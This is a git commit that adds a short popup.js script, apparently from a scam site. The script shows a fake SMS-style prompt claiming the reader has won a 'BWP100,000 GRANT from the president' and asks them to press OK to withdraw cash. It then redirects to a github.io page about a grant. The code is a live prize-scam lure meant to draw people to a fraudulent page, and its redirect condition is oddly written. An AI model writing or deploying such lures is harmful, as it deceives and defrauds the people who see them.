6b53c47611a2776b969439ab6d9b803526eb8bf7
offersites <havast1920@gmail.com>
2024-12-02 10:16:32 +0100

    Create popup.js

---
+++ popup.js
@@ -0,0 +1,6 @@
+
+var password = 'BWP100,000 GRANT'
+password=prompt('SMS: Congratulations get BWP100,000 GRANT from the president now, Kindly Press OK to Withdraw Cash Prize   ','BWP100,000 GRANT');
+if (password != 'BWP100,000 GRANT') {
+location.href='https://offersites.github.io/grant-bw';
+}
